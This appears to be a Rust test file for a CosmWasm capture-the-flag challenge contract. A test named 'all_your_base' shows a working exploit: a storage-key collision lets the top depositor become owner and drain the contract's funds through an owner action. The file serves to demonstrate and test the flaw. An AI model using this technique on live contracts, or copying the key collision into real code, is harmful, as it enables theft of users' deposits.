#[cfg(test)]
pub mod tests {
    use crate::{
        contract::DENOM,
        msg::{ExecuteMsg, InstantiateMsg, QueryMsg},
    };
    use cosmwasm_std::{coin, Addr, Empty, Uint128};
    use cw_multi_test::{App, Contract, ContractWrapper, Executor};

    pub fn challenge_contract() -> Box<dyn Contract<Empty>> {
        let contract = ContractWrapper::new(
            crate::contract::execute,
            crate::contract::instantiate,
            crate::contract::query,
        );
        Box::new(contract)
    }

    pub const USER1: &str = "user1";
    pub const USER2: &str = "user2";
    pub const ADMIN: &str = "admin";

    pub fn proper_instantiate() -> (App, Addr) {
        let mut app = App::default();
        let cw_template_id = app.store_code(challenge_contract());

        // init contract
        let msg = InstantiateMsg {
            owner: ADMIN.to_string(),
            threshold: Uint128::from(99u128),
        };

        let contract_addr = app
            .instantiate_contract(
                cw_template_id,
                Addr::unchecked(ADMIN),
                &msg,
                &[],
                "test",
                None,
            )
            .unwrap();

        app = mint_tokens(app, USER1.to_string(), Uint128::from(100u128));

        (app, contract_addr)
    }

    pub fn base_scenario() -> (App, Addr) {
        let mut app = App::default();
        let cw_template_id = app.store_code(challenge_contract());

        // init contract
        let msg = InstantiateMsg {
            owner: ADMIN.to_string(),
            threshold: Uint128::from(99u128),
        };

        let contract_addr = app
            .instantiate_contract(
                cw_template_id,
                Addr::unchecked(ADMIN),
                &msg,
                &[],
                "test",
                None,
            )
            .unwrap();

        // User 1 deposit
        app = mint_tokens(app, USER1.to_string(), Uint128::from(100u128));
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(100, DENOM)],
        )
        .unwrap();

        // User 2 deposit
        app = mint_tokens(app, USER2.to_string(), Uint128::from(110u128));
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(110, DENOM)],
        )
        .unwrap();

        (app, contract_addr)
    }

    pub fn mint_tokens(mut app: App, recipient: String, amount: Uint128) -> App {
        app.sudo(cw_multi_test::SudoMsg::Bank(
            cw_multi_test::BankSudo::Mint {
                to_address: recipient,
                amount: vec![coin(amount.u128(), DENOM)],
            },
        ))
        .unwrap();
        app
    }

    #[test]
    fn basic_flow() {
        let (mut app, contract_addr) = proper_instantiate();

        let bal = app.wrap().query_balance(USER1, DENOM).unwrap();
        assert_eq!(bal.amount, Uint128::new(100));

        // User 1 deposit
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(100, DENOM)],
        )
        .unwrap();

        let bal = app.wrap().query_balance(USER1, DENOM).unwrap();
        assert_eq!(bal.amount, Uint128::zero());

        // Query top depositor
        let top: Addr = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Top {})
            .unwrap();
        assert_eq!(top, Addr::unchecked(USER1));

        // User 1 withdraw
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr,
            &ExecuteMsg::Withdraw {
                amount: Uint128::new(100),
            },
            &[],
        )
        .unwrap();

        let bal = app.wrap().query_balance(USER1, DENOM).unwrap();
        assert_eq!(bal.amount, Uint128::new(100));
    }


    #[test]
    fn all_your_base() {
        let (mut app, contract_addr) = proper_instantiate();

        // give "hacker" 1_001 tokens and "grug" 1_000 tokens
        app = mint_tokens(app, "hacker".to_string(), Uint128::from(1_001u128));
        app = mint_tokens(app, "grug".to_string(), Uint128::from(1_000u128));

        // Verify that "admin" is contract owner to start
        let config: crate::msg::ConfigQueryResponse = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Config {})
            .unwrap();
        assert_eq!(config.owner, Addr::unchecked("admin"));

        // "grug" deposits 1_000 tokens
        app.execute_contract(
            Addr::unchecked("grug"),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(1_000, DENOM)],
        )
        .unwrap();
        let grug_bal = app.wrap().query_balance("grug", DENOM).unwrap();
        assert_eq!(grug_bal.amount, Uint128::zero());

        // "hacker" deposits 1_001 tokens, is now "TOP_DEPOSITOR"
        app.execute_contract(
            Addr::unchecked("hacker"),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(1_001, DENOM)],
        )
        .unwrap();
        let hacker_bal = app.wrap().query_balance("hacker", DENOM).unwrap();
        assert_eq!(hacker_bal.amount, Uint128::zero());

        // Query top depositor
        let top: Addr = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Top {})
            .unwrap();
        assert_eq!(top, Addr::unchecked("hacker"));

        // But "TOP_DEPOSITOR" and "OWNER" are both stored under the same key namespace of "address"
        let config: crate::msg::ConfigQueryResponse = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Config {})
            .unwrap();
        assert_eq!(config.owner, Addr::unchecked("hacker"));

        // that's not good...
        // "hacker" queries balance of contract and sends themselves all the tokens
        let contract_bal = app.wrap().query_balance(contract_addr.clone(), DENOM).unwrap();
        let steal_funds_msg: cosmwasm_std::CosmosMsg = cosmwasm_std::CosmosMsg::Bank(cosmwasm_std::BankMsg::Send { 
            to_address: "hacker".to_string(), 
            amount: vec![coin(contract_bal.amount.u128(), DENOM)]
        });
        app.execute_contract(
            Addr::unchecked("hacker"),
            contract_addr.clone(),
            &ExecuteMsg::OwnerAction { 
                msg: steal_funds_msg
            },
            &[],
        )
        .unwrap();

        // Assert that hacker now has 2_001 tokens
        let hacker_bal = app.wrap().query_balance("hacker", DENOM).unwrap();
        assert_eq!(hacker_bal.amount, Uint128::new(2_001));

        // Assert that contract has none
        let contract_bal = app.wrap().query_balance(contract_addr.clone(), DENOM).unwrap();
        assert_eq!(contract_bal.amount, Uint128::zero());

    }

}
